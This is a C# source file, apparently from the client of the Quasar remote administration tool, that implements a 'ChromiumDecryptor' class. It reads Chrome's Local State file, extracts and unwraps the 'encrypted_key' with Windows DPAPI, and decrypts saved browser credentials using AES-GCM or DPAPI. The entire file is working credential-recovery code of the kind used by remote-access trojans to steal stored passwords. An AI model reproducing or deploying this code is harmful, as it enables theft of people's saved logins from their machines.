using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (File.Exists(localStatePath))
                {
                    string localState = File.ReadAllText(localStatePath);

                    var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;

                    var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));

                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
            }
        }

        public string Decrypt(string cipherText)
        {
            var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
            if (cipherText.StartsWith("v10") && _key != null)
            {
                return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
            }
            return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
        }

        private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            // TODO: Replace with .NET-own AES-GCM implementation in .NET Core 3.0+
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", nameof(message));

            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return plainText;
            }
        }
    }
}
